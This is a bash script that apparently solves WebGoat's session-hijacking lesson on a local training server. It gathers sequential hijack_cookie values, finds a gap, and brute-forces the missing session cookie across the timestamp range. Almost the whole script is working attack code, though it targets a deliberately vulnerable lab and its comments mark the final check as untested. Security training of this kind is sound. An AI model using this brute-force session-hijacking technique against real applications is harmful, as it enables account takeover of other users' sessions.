#!/bin/bash
####################################
# TODO: IMPORTANT
# You need to setup the cookie from the post response is the JSESSIONID
####################################
ID_SESSION="B4aXPlUd4EOCMsI0N6stDJ1N7gu7skjtT-5h4N5j"
####################################

output_file="hijack_cookies.txt"
output_file2="skipped_values.txt"

> "$output_file"
> "$output_file2"

# Capturar los encabezados de respuesta
getcookie(){
	response=$(curl -s -D - -X POST http://localhost:8080/WebGoat/HijackSession/login \
		-H 'host: localhost:8080' \
		-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' \
		-H 'Accept: */*' \
		-H 'Accept-Language: en-US,en;q=0.5' \
		-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
		-H 'X-Requested-With: XMLHttpRequest' \
		-H 'Origin: http://localhost:8080' \
		-H 'Connection: keep-alive' \
		-H 'Content-Length: 29' \
		-H 'Referer: http://localhost:8080/WebGoat/start.mvc?username=alffy-root' \
		-H "cookie: JSESSIONID=${ID_SESSION};" \
		--data-raw 'username=alffy&password=alffy')

  # Extraer el valor de Set-Cookie
	hijack_cookie=$(echo "$response" | grep -i "Set-Cookie" | grep -o 'hijack_cookie=[^;]*' | cut -d '=' -f2)
	echo "hijack_cookie: $hijack_cookie"
}

hijack(){
	hijackCookie=$1
	response=$(curl -s -D - -X POST http://localhost:8080/WebGoat/HijackSession/login \
		-H 'host: localhost:8080' \
		-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' \
		-H 'Accept: */*' \
		-H 'Accept-Language: en-US,en;q=0.5' \
		-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
		-H 'X-Requested-With: XMLHttpRequest' \
		-H 'Origin: http://localhost:8080' \
		-H 'Connection: keep-alive' \
		-H 'Content-Length: 29' \
		-H 'Referer: http://localhost:8080/WebGoat/start.mvc?username=alffy-root' \
		-H "cookie: JSESSIONID=${ID_SESSION}; hijack_cookie=${hijackCookie}" \
		--data-raw 'username=alffy&password=alffy')

  # Extraer el valor de Set-Cookie
	# TODO:TEST
	# This is not test yet
	lessonCompleted=$(echo "$response" | grep -o 'lessonCompleted=[^;]*' | cut -d '=' -f2)
	if [ "$lessonCompleted" = "true" ]; then
		echo "lessonCompleted: $lessonCompleted -> Funciono el hijackCookie!!!"
		exit 1
	fi
	echo $response
}

# Realizar 10 peticiones y guardar los valores en un archivo
for i in {1..5}; do
    hijack_cookie=$(getcookie)
    echo "Peticion $i: $hijack_cookie"
    echo "$hijack_cookie" >> "$output_file"
    # sleep 1 # Añadir un retraso entre peticiones si es necesario
done

# Comparar los valores guardados en el archivo
previous_number=""
while read -r line; do
    current_number=$(echo "$line" | cut -d '-' -f1 | grep -o '[0-9]*$')
    after_timestamps=$(echo "$line" | cut -d '-' -f2)

    if [ -n "$previous_number" ]; then
        expected_number=$((previous_number + 1))

        if [ "$current_number" -ne "$expected_number" ]; then
            missing_number=$expected_number
            echo "Sequence jump detected: $previous_number -> $current_number"
            # echo "Missing value: $missing_number"
            echo "$before_timestamps, $missing_number, $after_timestamps"
            # Guardar el valor faltante
            # echo "$missing_number" >> skipped_values.txt
						# Es donde formamos la nueva peticion. Para hacer el hijack 
						timeCount=$before_timestamps
						while [ $timeCount -le $after_timestamps ]; do
							# echo $timeCount
							timeCount=$((timeCount + 1))
							setMsg=$missing_number-$timeCount
							echo $setMsg
							hijack $setMsg
						done
				fi
		fi

		previous_number="$current_number"
		before_timestamps="$after_timestamps"
	done < "$output_file"
